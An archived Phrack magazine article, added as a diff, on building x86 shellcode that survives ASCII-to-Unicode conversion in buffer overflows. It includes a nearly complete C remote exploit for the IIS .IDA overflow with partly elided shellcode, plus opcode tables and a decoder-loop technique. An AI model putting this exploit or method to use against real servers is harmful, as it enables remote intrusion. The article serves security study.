@@ -1,0 +1,1368 @@
+<?xml version="1.0" encoding="utf-8" ?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en">
+<head>
+   <meta http-equiv="content-type" content="text/html; charset=utf-8" />
+   <meta http-equiv="content-language" content="en" />
+   <meta name="description" content="Phrack staff website." />
+   <meta name="keywords" content="phrack" />
+   <meta name="robots" content="follow,index,all" />
+
+   <meta name="revisit-after" content="7 days" />
+   
+   <title>.:: Phrack Magazine ::.</title>
+   
+   <link href="../../css/style.css" rel="stylesheet" type="text/css">
+</head>
+<body id="top">
+<div align="center" class="texto-2-bold">
+[ <a href="../../index.html" title="News">News</a> ]
+[ <a href="../../" title="Paper Feed">Paper Feed</a> ]
+[ <a href="../../issues/71/1.html" title="Issues">Issues</a> ]
+[ <a href="../../authors.html" title="Authors">Authors</a> ]
+[ <a href="../../archives/" title="Archives">Archives</a> ]
+[ <a href="../../contact.html" title="Contact">Contact</a> ]
+
+</div>
+
+<center>
+   <br>
+   <br>
+   <img width="600" src="../../images/phrack-logo.jpg" alt="..[ Phrack Magazine ]..">
+   <br>
+
+   <div class="texto-2">
+   <div class="p-title">.:: Building IA32 'Unicode-Proof' Shellcodes ::.</div>
+   <hr width="600" />
+   </div>
+   
+   <div style="padding-top: 4px; padding-bottom: 4px;">
+<div class="around">
+
+<div class="details"><strong>Issues</strong>: 
+[ <a href="../../issues/1/1.html" title="Issue 1">1</a> ] [ <a href="../../issues/2/1.html" title="Issue 2">2</a> ] [ <a href="../../issues/3/1.html" title="Issue 3">3</a> ] [ <a href="../../issues/4/1.html" title="Issue 4">4</a> ] [ <a href="../../issues/5/1.html" title="Issue 5">5</a> ] [ <a href="../../issues/6/1.html" title="Issue 6">6</a> ] [ <a href="../../issues/7/1.html" title="Issue 7">7</a> ] [ <a href="../../issues/8/1.html" title="Issue 8">8</a> ] [ <a href="../../issues/9/1.html" title="Issue 9">9</a> ] [ <a href="../../issues/10/1.html" title="Issue 10">10</a> ] [ <a href="../../issues/11/1.html" title="Issue 11">11</a> ] [ <a href="../../issues/12/1.html" title="Issue 12">12</a> ] [ <a href="../../issues/13/1.html" title="Issue 13">13</a> ] [ <a href="../../issues/14/1.html" title="Issue 14">14</a> ] [ <a href="../../issues/15/1.html" title="Issue 15">15</a> ] [ <a href="../../issues/16/1.html" title="Issue 16">16</a> ] [ <a href="../../issues/17/1.html" title="Issue 17">17</a> ] [ <a href="../../issues/18/1.html" title="Issue 18">18</a> ] [ <a href="../../issues/19/1.html" title="Issue 19">19</a> ] [ <a href="../../issues/20/1.html" title="Issue 20">20</a> ] [ <a href="../../issues/21/1.html" title="Issue 21">21</a> ] [ <a href="../../issues/22/1.html" title="Issue 22">22</a> ] [ <a href="../../issues/23/1.html" title="Issue 23">23</a> ] [ <a href="../../issues/24/1.html" title="Issue 24">24</a> ] [ <a href="../../issues/25/1.html" title="Issue 25">25</a> ] [ <a href="../../issues/26/1.html" title="Issue 26">26</a> ] [ <a href="../../issues/27/1.html" title="Issue 27">27</a> ] [ <a href="../../issues/28/1.html" title="Issue 28">28</a> ] [ <a href="../../issues/29/1.html" title="Issue 29">29</a> ] [ <a href="../../issues/30/1.html" title="Issue 30">30</a> ] [ <a href="../../issues/31/1.html" title="Issue 31">31</a> ] [ <a href="../../issues/32/1.html" title="Issue 32">32</a> ] [ <a href="../../issues/33/1.html" title="Issue 33">33</a> ] [ <a href="../../issues/34/1.html" title="Issue 34">34</a> ] [ <a href="../../issues/35/1.html" title="Issue 35">35</a> ] [ <a href="../../issues/36/1.html" title="Issue 36">36</a> ] [ <a href="../../issues/37/1.html" title="Issue 37">37</a> ] [ <a href="../../issues/38/1.html" title="Issue 38">38</a> ] [ <a href="../../issues/39/1.html" title="Issue 39">39</a> ] [ <a href="../../issues/40/1.html" title="Issue 40">40</a> ] [ <a href="../../issues/41/1.html" title="Issue 41">41</a> ] [ <a href="../../issues/42/1.html" title="Issue 42">42</a> ] [ <a href="../../issues/43/1.html" title="Issue 43">43</a> ] [ <a href="../../issues/44/1.html" title="Issue 44">44</a> ] [ <a href="../../issues/45/1.html" title="Issue 45">45</a> ] [ <a href="../../issues/46/1.html" title="Issue 46">46</a> ] [ <a href="../../issues/47/1.html" title="Issue 47">47</a> ] [ <a href="../../issues/48/1.html" title="Issue 48">48</a> ] [ <a href="../../issues/49/1.html" title="Issue 49">49</a> ] [ <a href="../../issues/50/1.html" title="Issue 50">50</a> ] [ <a href="../../issues/51/1.html" title="Issue 51">51</a> ] [ <a href="../../issues/52/1.html" title="Issue 52">52</a> ] [ <a href="../../issues/53/1.html" title="Issue 53">53</a> ] [ <a href="../../issues/54/1.html" title="Issue 54">54</a> ] [ <a href="../../issues/55/1.html" title="Issue 55">55</a> ] [ <a href="../../issues/56/1.html" title="Issue 56">56</a> ] [ <a href="../../issues/57/1.html" title="Issue 57">57</a> ] [ <a href="../../issues/58/1.html" title="Issue 58">58</a> ] [ <a href="../../issues/59/1.html" title="Issue 59">59</a> ] [ <a href="../../issues/60/1.html" title="Issue 60">60</a> ] [ <a class="current" href="../../issues/61/1.html" title="Issue 61">61</a> ] [ <a href="../../issues/62/1.html" title="Issue 62">62</a> ] [ <a href="../../issues/63/1.html" title="Issue 63">63</a> ] [ <a href="../../issues/64/1.html" title="Issue 64">64</a> ] [ <a href="../../issues/65/1.html" title="Issue 65">65</a> ] [ <a href="../../issues/66/1.html" title="Issue 66">66</a> ] [ <a href="../../issues/67/1.html" title="Issue 67">67</a> ] [ <a href="../../issues/68/1.html" title="Issue 68">68</a> ] [ <a href="../../issues/69/1.html" title="Issue 69">69</a> ] [ <a href="../../issues/70/1.html" title="Issue 70">70</a> ] [ <a href="../../issues/71/1.html" title="Issue 71">71</a> ] 
+</div>
+<div class="opt" align="center"><div class="rt"><a href="../../archives/tgz/phrack61.tar.gz" title="Get current issue tar.gz">Get tar.gz</a></div><strong>Current issue</strong> : #<a href="../../archives/tgz/phrack61.tar.gz" title="Get current issue tar.gz">61</a> | <strong>Release date</strong> : <b>2003-08-13</b> | <strong>Editor</strong> : <b>Phrack Staff</b></div>
+
+<div style="border-top: 1px solid black; border-bottom: 2px solid black">
+<table class="tissue" cellpadding="0" cellspacing="0">
+   <tbody>
+      <tr><td align="left"><a href="../../issues/61/1.html#article">Introduction</a></td><td align="right">Phrack Staff</td></tr>
+<tr><td align="left"><a href="../../issues/61/2.html#article">Loopback</a></td><td align="right">Phrack Staff</td></tr>
+<tr><td align="left"><a href="../../issues/61/3.html#article">Linenoise</a></td><td align="right">Phrack Staff</td></tr>
+<tr><td align="left"><a href="../../issues/61/4.html#article">Toolz Armory</a></td><td align="right">Phrack Staff</td></tr>
+<tr><td align="left"><a href="../../issues/61/5.html#article">Phrack Prophile on digit</a></td><td align="right">Phrack Staff</td></tr>
+<tr><td align="left"><a href="../../issues/61/6.html#article">Advanced Doug Lea's malloc exploits</a></td><td align="right">jp</td></tr>
+<tr><td align="left"><a href="../../issues/61/7.html#article">Hijacking Linux Page Fault Handler</a></td><td align="right">buffer</td></tr>
+<tr><td align="left"><a href="../../issues/61/8.html#article">The Cerberus ELF interface</a></td><td align="right">mayhem</td></tr>
+<tr><td align="left"><a href="../../issues/61/9.html#article">Polymorphic Shellcode Engine</a></td><td align="right">CLET team</td></tr>
+<tr><td align="left"><a href="../../issues/61/10.html#article">Infecting Loadable Kernel Modules</a></td><td align="right">truff</td></tr>
+<tr><td align="left"><a href="../../issues/61/11.html#article">Building IA32 'Unicode-Proof' Shellcodes</a></td><td align="right">obscou</td></tr>
+<tr><td align="left"><a href="../../issues/61/12.html#article">Fun with the Spanning Tree Protocol</a></td><td align="right">Vladislav V. Myasnyankin &amp; Oleg K. Artemjev</td></tr>
+<tr><td align="left"><a href="../../issues/61/13.html#article">Hacking the Linux Kernel Network Stack</a></td><td align="right">bioforge</td></tr>
+<tr><td align="left"><a href="../../issues/61/14.html#article">Kernel Rootkit Experiences &amp; the Future</a></td><td align="right">stealth</td></tr>
+<tr><td align="left"><a href="../../issues/61/15.html#article">Phrack World News</a></td><td align="right">Phrack Staff</td></tr>
+
+   </tbody>
+</table>
+
+<div class="opt" id="article"><strong>Title</strong> : Building IA32 'Unicode-Proof' Shellcodes</div>
+<div class="opt-bottom"> <strong>Author</strong> : obscou</div>
+<pre>                           ==Phrack Inc.==
+
+              Volume 0x0b, Issue 0x3d, Phile #0x0b of 0x0f
+
+|=------------=[ Building IA32 'Unicode-Proof' Shellcodes ]=-------------=|
+|=-----------------------------------------------------------------------=|
+|=------------=[ obscou &lt;obscou@dr.com||wishkah@chek.com&gt; ]=-------------=|
+
+
+
+           
+--[ Contents
+
+  0 - The Unicode Standard
+
+  1 - Introduction
+
+  2 - Our Instructions set
+
+  3 - Possibilities
+
+  4 - The Strategy
+
+  5 - Position of the code
+
+  6 - Conclusion
+
+  7 - Appendix : Code
+
+
+--[ 0 - The Unicode Standard
+
+While   exploiting   buffer   overflows,   we  sometime face a difficulty : 
+character transformations. In fact, the exploited program may have modified
+our buffer, by setting it to lower/upper case, or by getting rid of 
+non-alphanumeric characters, thus stopping the attack as our shellcode 
+usually can't run anymore. The transformation we are dealing here with is
+the transformation of a C-type string (common zero terminated string) to a
+Unicode string.
+
+
+Here is a quick overview of what Unicode is (source : www.unicode.org)
+
+
+	&quot;What is Unicode?
+	Unicode provides a unique number for every character,
+	no matter what the platform,
+	no matter what the program,
+	no matter what the language.&quot;
+
+		--- www.unicode.org
+
+In fact, because Internet has become so popular, and because we all have
+different languages and therefore different charaters, there is now a need
+to have a standard so that computers can exchange data whatever the
+program, platform, language, network etc...
+Unicode is a 16-bits character set capable of encoding all known characters
+and used as a worldwide character-encoding standard.
+
+Today, Unicode is used by many industry leaders such as :
+
+	Apple
+	HP
+	IBM
+	Microsoft
+	Oracle
+	Sun
+	and many others...
+
+The Unicode standard is requiered by softwares like : 
+(non exhaustive list, see unicode.org for full list)
+
+Operating Systems :
+
+	Microsoft Windows CE, Windows NT, Windows 2000, and Windows XP 
+	GNU/Linux with glibc 2.2.2 or newer - FAQ support 
+	Apple Mac OS 9.2, Mac OS X 10.1, Mac OS X Server, ATSUI 
+	Compaq's Tru64 UNIX, Open VMS 
+	IBM AIX, AS/400, OS/2 
+	SCO UnixWare 7.1.0 
+	Sun Solaris 
+
+And of course, any software that runs under thoses systems...
+
+http://www.unicode.org/charts/ : displays the Unicode table of caracters
+It looks like this :
+
+|   Range   |	Character set
+|-----------|--------------------
+| 0000-007F | Basic Latin
+| 0080-00FF | Latin-1 Supplement
+| 0100-017F | Latin Extended-A
+|   [...]   |      [...]
+| 0370-03FF | Greek and Coptic
+|   [...]   |      [...]
+| 0590-05FF | Hebrew
+| 0600-06FF | Arabic
+|   [...]   |      [...]
+| 3040-309F | Japanese Hiragana
+| 30A0-30FF | Japanese Katakana
+
+
+.... and so on until everybody is happy !
+
+Unicode 4.0 includes characters for :
+
+ Basic Latin				Block Elements 
+ Latin-1 Supplement  			Geometric Shapes 
+ Latin Extended-A  			Miscellaneous Symbols 
+ Latin Extended-B  			Dingbats 
+ IPA Extensions  			Miscellaneous Math. Symbols-A 
+ Spacing Modifier Letters  		Supplemental Arrows-A 
+ Combining Diacritical Marks  		Braille Patterns 
+ Greek  Supplemental 			Arrows-B 
+ Cyrillic  Miscellaneous 		Mathematical Symbols-B 
+ Cyrillic Supplement  			Supplemental Mathematical Operators
+ Armenian  				CJK Radicals Supplement 
+ Hebrew  				Kangxi Radicals 
+ Arabic  				Ideographic Description Characters
+ Syriac  				CJK Symbols and Punctuation 
+ Thaana  				Hiragana 
+ Devanagari  				Katakana 
+ Bengali  				Bopomofo 
+ Gurmukhi  				Hangul Compatibility Jamo 
+ Gujarati  				Kanbun 
+ Oriya  				Bopomofo Extended 
+ Tamil  				Katakana Phonetic Extensions 
+ Telugu  				Enclosed CJK Letters and Months 
+ Kannada  				CJK Compatibility
+ Malayalam  				CJK Unified Ideographs Extension A
+ Sinhala  				Yijing Hexagram Symbols
+ Thai  					CJK Unified Ideographs
+ Lao  					Yi Syllables
+ Tibetan  				Yi Radicals
+ Myanmar  				Hangul Syllables
+ Georgian 				High Surrogates
+ Hangul Jamo  				Low Surrogates
+ Ethiopic  				Private Use Area
+ Cherokee  				CJK Compatibility Ideographs
+ Unified Canadian Aboriginal Syllabic  	Alphabetic Presentation Forms
+ Ogham  				Arabic Presentation Forms-A
+ Runic  				Variation Selectors
+ Tagalog 				Combining Half Marks
+ Hanunoo  				CJK Compatibility Forms
+ Buhid  				Small Form Variants
+ Tagbanwa  				Arabic Presentation Forms-B
+ Khmer  				Halfwidth and Fullwidth Forms
+ Mongolian  				Specials
+ Limbu  				Linear B Syllabary
+ Tai Le  				Linear B Ideograms
+ Khmer Symbols 				Aegean Numbers
+ Phonetic Extensions  			Old Italic
+ Latin Extended 			Additional  Gothic
+ Greek Extended  			Deseret
+ General Punctuation  			Shavian
+ Superscripts and Subscripts 		Osmanya
+ Currency Symbols  			Cypriot Syllabary
+ Combining Marks for Symbols  		Byzantine Musical Symbols
+ Letterlike Symbols  			Musical Symbols
+ Number Forms  				Tai Xuan Jing Symbols
+ Arrows  				Mathematical Alphanumeric Symbols
+ Mathematical Operators  		CJK Unified Ideographs Extension B
+ Miscellaneous Technical  		CJK Compatibility Ideographs Supp.
+ Control Pictures  			Tags
+ Optical Character Recognition  	Variation Selectors Supplement 
+ Enclosed Alphanumerics  		Supplementary Private Use Area-A 
+ Box Drawing  				Supplementary Private Use Area-B 
+
+Yes it's impressive.
+
+
+Microsoft says :
+
+&quot;Unicode is a worldwide character-encoding standard. Windows NT, Windows
+2000, and Windows XP use it exclusively at the system level for character
+and string manipulation. Unicode simplifies localization of software and
+improves multilingual text processing. By implementing it in your
+applications, you can enable the application with universal data exchange
+capabilities for global marketing, using a single binary file for every
+possible character code.&quot;
+Wa have to notice that The Windows programming interface uses ANSI and
+Unicode API's for each API, for example: 
+
+The API : MessageBox (displays a msgbox of course)
+Is exported by User32.dll with : 
+		MessageBoxA	(ANSI)
+		MessageBoxW	(Unicode)
+
+MessageBoxA will accept a standard C-type string as an argument
+MessageBoxW requieres Unicode strings as arguments.
+
+According to Microsoft, internal use of strings is handled by the system
+itself that ensures a transparent translation of strings between different
+standards.
+But if you want to use ANSI in a C program compiling under windows, you
+just have to define UNICODE and every API will be replaced by its 'W'
+version.
+This sounds logical to me, let's get to the point now...
+
+
+
+--[ 1 - Introduction
+
+
+
+We will consider the following situation :
+
+You send some data to a vulnerable server, and your data is considered as
+ASCII (standard 8-bits character encoding), then your buffer is translated
+into unicode for compatibility reasons, and then an overflow occurs with
+your transformed buffer.
+
+For example, such an input buffer :
+4865 6C6C 6F20 576F 726C 6420 2100 0000 Hello World !...
+0000 0000 0000 0000 0000 0000 0000 0000 ................
+
+Would turn into :
+4800 6500 6C00 6C00 6F00 2000 5700 6F00 H.e.l.l.o. .W.o.
+7200 6C00 6400 2000 2100 0000 0000 0000 r.l.d. .!.......
+
+Then bang, overflow (yeah i know my example is stupid)
+
+Under Win32 plateforms, a process usually starts at 00401000, this makes
+it possible to smash EIP with a return address that looks like : 
+
+                         ????:00??00??
+
+So even with such a transformation, exploitation is still possible.
+It will be a lot harder to get a working shellcode.
+One possibility is to stuff the stack with untranformed data than contains
+the same shellcode many times, then do the overflow with the tranformed
+buffer, and make it return to one of your numerous shellcodes.
+Here we assume that this was impossible because all buffers are unicode.
+Needless to say that our assembly code won't go through this safely.
+So we need to find a way to build a shellcode that resists to such a 
+transformation. We need to find opcodes containing null bytes to build our
+shellcode.
+
+Here is an example, it is a bit old but it is an example of how we can
+manage to get a shellcode executed even if our sent buffer is f**cked
+(This exploit was working on my box, it runs against IIS www service) :
+
+
+---------------- CUT HERE -------------------------------------------------
+
+/* 
+   IIS .IDA remote exploit
+
+
+   formatted return address : 0x00530053
+   IIS sticks our very large buffer at 0x0052....
+   We jump to the buffer and get to the point
+   
+
+   by obscurer
+*/
+
+#include &lt;windows.h&gt;
+#include &lt;winsock.h&gt;
+#include &lt;stdio.h&gt;
+
+void usage(char *a);
+int wsa();
+
+/* My Generic Win32 Shellcode */
+unsigned char shellcode[]={
+&quot;\xEB\x68\x4B\x45\x52\x4E\x45\x4C\x13\x12\x20\x67\x4C\x4F\x42\x41&quot;
+&quot;\x4C\x61\x4C\x4C\x4F\x43\x20\x7F\x4C\x43\x52\x45\x41\x54\x20\x7F&quot;
+[......]
+[......]
+[......]
+&quot;\x09\x05\x01\x01\x69\x01\x01\x01\x01\x57\xFE\x96\x11\x05\x01\x01&quot;
+&quot;\x69\x01\x01\x01\x01\xFE\x96\x15\x05\x01\x01\x90\x90\x90\x90\x00&quot;};
+
+int main (int argc, char **argv)
+{
+
+int sock;
+struct hostent *host;
+struct sockaddr_in sin;
+int index;
+
+char *xploit;
+char *longshell;
+
+
+char retstring[250];
+
+if(argc!=4&amp;&amp;argc!=5) usage(argv[0]);
+
+
+if(wsa()==FALSE)
+{
+	printf(&quot;Error : cannot initialize winsock\n&quot;);
+	exit(0);
+}
+
+
+int size=0;
+
+if(argc==5)
+size=atoi(argv[4]);
+
+
+printf(&quot;Beginning Exploit building\n&quot;);
+
+xploit=(char *)malloc(40000+size);
+longshell=(char *)malloc(35000+size);
+if(!xploit||!longshell) 
+{
+printf(&quot;Error, not enough memory to build exploit\n&quot;);
+return 0;
+}
+
+if(strlen(argv[3])&gt;65)
+{
+printf(&quot;Error, URL too long to fit in the buffer\n&quot;);
+return 0;
+}
+
+for(index=0;index&lt;strlen(argv[3]);index++)
+shellcode[index+139]=argv[3][index]^0x20;
+
+memset(xploit,0,40000+size);
+memset(longshell,0,35000+size);
+memset (longshell, '\x41', 30000+size);
+
+for(index=0;index&lt;sizeof(shellcode);index++)
+longshell[index+30000+size]=shellcode[index];
+
+longshell[30000+sizeof(shellcode)+size]=0;
+
+
+memset(retstring,'S',250);
+
+sprintf(xploit,
+        &quot;GET /NULL.ida?%s=x HTTP/1.1\nHost: localhost\nAlex: %s\n\n&quot;,
+	retstring,
+        longshell);
+
+
+printf(&quot;Exploit build, connecting to %s:%d\n&quot;,argv[1],atoi(argv[2]));
+
+sock=socket(AF_INET,SOCK_STREAM,0);
+if(sock&lt;0)
+{
+	printf(&quot;Error : Couldn't create a socket\n&quot;);
+	return 0;
+}
+
+
+if ((inet_addr (argv[1]))==-1) 
+    {
+	host = gethostbyname (argv[1]);
+    if (!host)
+    {
+		printf (&quot;Error : Couldn't resolve host\n&quot;);
+		return 0;
+    }
+memcpy((unsigned long *)&amp;sin.sin_addr.S_un.S_addr,
+       (unsigned long *)host-&gt;h_addr,
+       sizeof(host-&gt;h_addr));
+
+}
+else sin.sin_addr.S_un.S_addr=inet_addr(argv[1]);
+
+
+sin.sin_family=AF_INET;
+sin.sin_port=htons(atoi(argv[2]));
+
+index=connect(sock,(struct sockaddr *)&amp;sin,sizeof(sin));
+if (index==-1)
+{
+	printf(&quot;Error : Couldn't connect to host\n&quot;);
+	return 0;
+}
+
+printf(&quot;Connected to host, sending shellcode\n&quot;);
+
+index=send(sock,xploit,strlen(xploit),0);
+if(index&lt;1)
+{
+	printf(&quot;Error : Couldn't send trough socket\n&quot;);
+	return 0;
+}
+
+printf(&quot;Done, waiting for an answer\n&quot;);
+
+memset (xploit,0, 2000);
+
+index=recv(sock,xploit,100,0);
+if(index&lt;0)
+{
+	printf(&quot;Server crashed, if exploit didn't work,
+				increase buffer size by 10000\n&quot;);
+	exit(0);
+}
+
+
+printf(&quot;Exploit didn't seem to work, closing connection\n&quot;,xploit);
+
+closesocket(sock);
+
+printf(&quot;Done\n&quot;);
+
+return 0;
+}
+---------------- CUT HERE -------------------------------------------------
+
+
+In this example, the exploitation string had to be as follows :
+
+&quot;GET /NULL.ida?[BUFFER]=x HTTP/1.1\nHost: localhost\nAlex: [ANY]\n\n&quot;
+
+If [BUFFER] is big enough, EIP is smashed with what it contains.
+But, i've noticed that [BUFFER] has been transformed into unicode when the
+overflow occurs. But something interesting was that [ANY] was a clean
+ASCII buffer, being mapped in memory at around : 00530000...
+So i tried to set [BUFFER] to &quot;SSSSSSSSSSSSS&quot; (S = 0x53)
+After the unicode transformation, it became : 
+
+...00 53 00 53 00 53 00 53 00 53 00 53 00 53 00 53 00 53...
+
+The EIP was smashed with : 0x00530053, IIS returned on somewhere around
+[ANY], where i had put a huge space of 0x41 = &quot;A&quot; (increments a register)
+and then, at the end of [ANY], my shellcode.
+And this worked. But if we have no clean buffer, we are unable to install
+a shellcode somewhere in memory. We have to find another solution.
+
+
+
+
+--[ 2 - Our Instructions set
+
+
+
+We must keep in mind that we can't use absolute addresses for calls, jmp...
+because we want our shellcode to be as portable as possible.
+First, we have to know which opcodes can be used, and which can't be used
+in order to find a strategy. As used in the Intel papers :
+
+r32 refers to a 32 bits register (eax, esi, ebp...)
+r8  refers to a  8 bits register (ah, bl, cl...)
+
+
+
+     - UNCONDITIONAL JUMPS (JMP)
+
+JMP's possible opcodes are EB and E9 for relative jumps, we can't use them
+as they must be followed by a byte (00 would mean a jump to the next 
+instruction which is fairly unuseful)
+
+FF and EA are absolute jumps, these opcodes can't be followed by a 00,
+except if we want to jump to a known address, which we won't do as this
+would mean that our shellcode contains harcoded addresses.
+
+
+
+     - CONDITIONAL JUMPS (Jcc : JNE, JAE, JNE, JL, JZ, JNG, JNS...)
+
+The syntaxe for far jumps can't be used as it needs 2 consecutives non null
+bytes. the syntaxe for near jumps can't be used either because the opcode 
+must be followed by the distance to jump to, which won't be 00. Also, 
+JMP r32 is impossible.
+
+
+
+     - LOOPs (LOOP, LOOPcc : LOOPE, LOOPNZ..)
+
+Same problem : E0, or E1, or E2 are LOOP opcodes, they must me followed by
+the number of bytes to cross...
+
+
+     - REPEAT (REP, REPcc : REPNE, REPNZ, REP + string operation)
+
+All this is impossible to do because thoses intructions all begin with a
+two bytes opcode.
+
+
+     - CALLs 
+
+Only the relative call can be usefull :
+E8 ?? ?? ?? ??
+In our case, we must have : 
+E8 00 ?? 00 ??    (with each ?? != 00)
+We can't use this as our call would be at least 01000000 bytes further...
+Also, CALL r32 is impossible.
+
+
+     - SET BYTE ON CONDITION (SETcc)
+
+This instruction needs 2 non nul bytes. (SETA is 0F 97  for example).
+
+
+
+Hu oh... This is harder as it may seem... We can't do any test... Because
+we can't do anything conditional ! Moreover, we can't move along our code :
+no Jumps and no Calls are permitted, and no Loops nor Repeats can be done.
+
+Then, what can we do ?
+The fact that we have a lot of NULLS will allow a lot of operation on the
+EAX register... Because when you use EAX, [EAX], AX, etc.. as operand, 
+it is often coded in Hex with a 00.
+
+
+
+     - SINGLE BYTE OPCODES
+
+We can use any single byte opcode, this will give us any INC or DEC on any
+register, XCHG and PUSH/POP are also possible, with registers as operands.
+So we can do :
+XCHG r32,r32
+POP r32
+PUSH r32
+
+Not bad.
+
+
+     - MOV
+ ________________________________________________________________
+|8800              mov [eax],al                                  |
+|8900              mov [eax],eax                                 |
+|8A00              mov al,[eax]                                  |
+|8B00              mov eax,[eax]                                 |
+|                                                                |
+|Quite unuseful.                                                 |
+|________________________________________________________________|
+
+ ________________________________________________________________
+|A100??00??        mov eax,[0x??00??00]                          |
+|A200??00??        mov [0x??00??00],al                           |
+|A300??00??        mov [0x??00??00],eax                          |
+|                                                                |
+|These are unuseful to us. (We said no hardcoded addresses).     |
+|________________________________________________________________|
+
+ ________________________________________________________________
+|B_00              mov r8,0x0                                    |
+|A4                movsb                                         |
+|                                                                |
+|Maybe we can use these ones.                                    |
+|________________________________________________________________|
+
+ ________________________________________________________________
+|B_00??00??        mov r32,0x??00??00                            |
+|C600??            mov byte [eax],0x??                           |
+|                                                                |
+|This might be interesting for patching memory.                  |
+|________________________________________________________________|
+
+
+
+     - ADD
+
+ ________________________________________________________________
+|00__              add [r32], r8                                 |
+|                                                                | 
+| Using any register as a pointer, we can add bytes in memory.   |
+|                                                                |
+|00__              add r8,r8                                     |
+|                                                                |
+| Could be a way to modify a register.                           |
+|________________________________________________________________|
+
+
+     - XOR
+
+ ________________________________________________________________
+|3500??00??        xor eax,0x??00??00                            |
+|                                                                | 
+|                                                                |
+| Could be a way to modify the EAX register.                     |
+|________________________________________________________________|
+
+
+     - PUSH
+
+ ________________________________________________________________
+|6A00              push dword 0x00000000                         |
+|6800??00??        push dword 0x??00??00                         | 
+|                                                                |
+| Only this can be made.                                         |
+|________________________________________________________________|
+
+
+--[ 3 - Possibilities
+
+
+First we have to get rid of a small detail : the fact that we have
+such 0x00 in our code may requier caution because if you return from
+smashed EIP to ADDR :
+
+... ?? 00 ?? 00 ?? 00 ?? 00 ?? 00 ...
+    ||
+   ADDR
+
+The result may be completely different if you ret to ADDR or ADDR+1 !
+But, we can use as 'NOP' instruction, instructions like : 
+
+ ________________________________________________________________
+|0400              add al,0x0                                    |
+|________________________________________________________________|
+
+Because : 000400 is : add [2*eax],al, we can jump wherever we want, we
+won't be bothered by the fact that we have to fall on a 0x00 or not.
+
+But this need 2*eax to be a valid pointer.
+We also have :
+
+ ________________________________________________________________
+|06                push es                                       |
+|0006              add [esi],al                                  |
+|                                                                |
+|0F000F            str [edi]                                     |
+|000F              add [edi],cl                                  |
+|                                                                |
+|2E002E            add [cs:esi],ch                               |
+|002E              add [esi],ch                                  |
+|                                                                |
+|2F                das                                           |
+|002F              add [edi],ch                                  |
+|                                                                |
+|37                aaa                                           |
+|0037              add [edi],dh                                  |
+|                                  ; .... etc etc...             |
+|________________________________________________________________|
+
+We are just to be careful with this alignment problem.
+
+Next, let's see what can be done :
+
+XCHG, INC, DEC, PUSH, POP 32 bits registers can be done directly
+
+We can set a register (r32) to 00000000 :
+ ________________________________________________________________
+|push dword 0x00000000                                           |
+|pop r32                                                         |
+|________________________________________________________________|
+
+Notice that anything that can be done with EAX can be done with any other 
+register thanxs to the XCHG intruction.
+
+For example we can set any value to EDX with a 0x00 at second position :
+(for example : 0x12005678):
+ ________________________________________________________________
+|mov edx,0x12005600        ; EDX = 0x12005600                    | 
+|mov ecx,0xAA007800                                              |
+|add dl,ch                 ; EDX = 0x12005678                    |
+|________________________________________________________________|
+
+
+More difficult : we can set any value to EAX (for example), but we will
+have to use a little trick with the stack :
+
+ ________________________________________________________________
+|mov eax,0xAA003400        ; EAX = 0xAA003400                    |
+|push eax                                                        |
+|dec esp                                                         |
+|pop eax                   ; EAX = 0x003400??                    |
+|add eax,0x12005600        ; EAX = 0x123456??                    |
+|mov al,0x0                ; EAX = 0x12345600                    |
+|mov ecx,0xAA007800                                              |
+|add al,ch                                                       |
+|                   ; finally : EAX = 0x12345678                 |
+|________________________________________________________________|
+
+
+Importante note : we migth want to set some 0x00 too :
+
+If we wanted a 0x00 instead of 0x12, then instead of adding 0x00120056 to
+the register, we can simply add 0x56 to ah :
+
+ ________________________________________________________________
+|mov ecx,0xAA005600                                              |
+|add ah,ch                                                       |
+|________________________________________________________________|
+
+If we wanted a 0x00 instead of 0x34, then we just need EAX = 0x00000000  to
+begin with, instead of trying to set this 0x34 byte.
+
+If we wanted a 0x00 instead of 0x56, then it is simple to substract 0x56 to
+ah by adding 0x100 - 0x56 = 0xAA to it :
+ ________________________________________________________________
+|                                     ; EAX = 0x123456??         |
+|mov ecx,0xAA00AA00                                              |
+|add ah,ch                                                       |
+|________________________________________________________________|
+
+If we wanted a 0x00 instead of the last byte, just give up the last line.
+
+Maybe if you haven't thougth of this, remember you can jump to a given
+location with (assuming the address is in EAX) :
+________________________________________________________________
+|50                push eax                                      |
+|C3                ret                                           |
+|________________________________________________________________|
+
+You may use this in case of a desperate situation.
+
+
+--[ 4 - The Strategy
+
+
+
+It seems nearly impossible to get a working shellcode with such a small set
+of opcodes... But it is not !
+The idea is the following :
+
+Given a working shellcode, we must get rid of the 00 between each byte.
+We need a loop, so let's do a loop, assuming EAX points to our shellcode :
+
+ _Loop_code_:____________________________________________________
+|                              ; eax points to our shellcode     |
+|                              ; ebx is 0x00000000               |
+|                              ; ecx is 0x00000500 (for example) |
+|                                                                |
+|          label:                                                |
+|43                inc ebx                                       |
+|8A1458            mov byte dl,[eax+2*ebx]                       |
+|881418            mov byte [eax+ebx],dl                         |
+|E2F7              loop label                                    |
+|________________________________________________________________|
+
+Problem : not unicode. So let's turn it into unicode :
+
+43 8A 14 58 88 14 18 E2 F7, would be :
+43 00 14 00 88 00 18 00 F7
+
+Then, considering the fact that we can write data at a location pointed by
+EAX, it will be simple to tranform thoses 00 into their original values.
+
+We just need to do this (we assume EAX points to our data) :
+
+ ________________________________________________________________
+|40                inc eax                                       |
+|40                inc eax                                       |
+|C60058            mov byte [eax],0x58                           |
+|________________________________________________________________|
+
+Problem : still not unicode. So that 2 bytes like 0x40 follow, we need a 
+00 between the two... As 00 can't fit, we need something like : 00??00,
+which won't interfere with our business, so :
+
+                 add [ebp+0x0],al   (0x004500)
+
+will do fine. Finally we get :
+
+ ________________________________________________________________
+|40                inc eax                                       |
+|004500            add [ebp+0x0],al                              |
+|40                inc eax                                       |
+|004500            add [ebp+0x0],al                              |
+|C60058            mov byte [eax],0x58                           |
+|________________________________________________________________|
+
+-&gt; [40 00 45 00 40 00 45 00 C6 00 58] is nothing but a unicode string !
+
+
+Before the loop, we must have some things done : 
+First we must set a proper counter, i propose to set ECX to 0x0500, this
+will deal with a 1280 bytes shellcode (but feel free to change this).
+-&gt;This is easy to do thanks to what we just noticed.
+Then we must have EBX = 0x00000000, so that the loop works properly.
+-&gt;It is also easy to do.
+Finally we must have EAX pointing to our shellcode in order to take away 
+the nulls. 
+-&gt;This will be the harder part of the job, so we will see that later.
+
